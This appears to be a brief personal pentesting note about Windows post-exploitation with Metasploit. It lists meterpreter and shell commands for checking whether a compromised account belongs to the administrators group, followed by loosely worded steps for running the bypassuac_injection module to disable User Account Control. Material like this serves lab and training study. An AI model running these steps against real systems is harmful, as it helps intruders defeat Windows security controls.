# How to see wheather the gained user access is a part of administrative group
+ meterpreter>shell
+ net users
+ net localgroup administrator


## bypassing uac
>search bypassuac_injection
- exploit/windows/local/bypassuac_injection
>set payload to x64 arch
>set target to windows\ x64 arch
### this will not elevate the privilage ..it will only disable the UAC 
